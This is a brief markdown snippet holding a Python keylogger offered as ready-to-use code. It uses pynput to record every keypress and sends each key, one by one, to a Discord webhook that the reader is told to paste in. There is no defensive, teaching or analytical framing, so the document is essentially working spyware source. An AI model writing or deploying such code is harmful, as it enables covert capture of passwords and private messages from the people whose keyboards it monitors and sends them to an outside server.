# Code 

``python
from pynput.keyboard import Listener
from discord_webhook import DiscordWebhook, DiscordEmbed

hook = "" #In "" put ur discord webhook

def writefile(key): 
    try:
        letter = str(key)
        webhook = DiscordWebhook(url=hook, content=letter)
        response = webhook.execute()
    except KeyError:
        pass

with Listener(on_press=writefile) as lis:
    lis.join()
